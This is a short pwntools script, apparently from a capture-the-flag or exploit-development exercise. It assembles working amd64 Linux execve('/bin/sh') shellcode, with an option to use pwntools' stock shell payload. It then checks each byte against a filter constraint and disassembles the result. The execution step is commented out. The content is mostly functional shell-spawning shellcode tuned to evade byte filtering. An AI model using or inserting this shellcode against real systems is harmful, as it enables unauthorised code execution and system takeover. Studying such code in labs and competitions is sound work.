from pwn import *

context.arch='amd64'
context.os='linux'

shell = asm(""" mov rbx, 0x68732f6e69622f
        push rbx
        mov eax, 59
        xor rsi, rsi
        xor rdx, rdx
        mov rdi, rsp
        syscall
        or r8, 0xf
""")

if args.BAD:
  shell = asm(shellcraft.sh())

log.info(b"----------------------------")
log.info(b"Finding Bad Bytes in Shellcode:")

even_bytes = 0
for b in shell:
    r = (0x123412340000 + b) & 2
    if r == 0:
       log.warn("\tBad Byte: %s" %hex(b))
       even_bytes+=1

log.info(b"----------------------------")
log.info(b"Total Violations: %i" %even_bytes)
log.info(b"----------------------------")
log.info(disasm(shell))
log.info(b"Testing Shellcode Execution")
log.info(b"----------------------------")
log.info(b'Shellcode Bytes: %s' %shell)
#p = run_shellcode(shell)
#p.interactive()

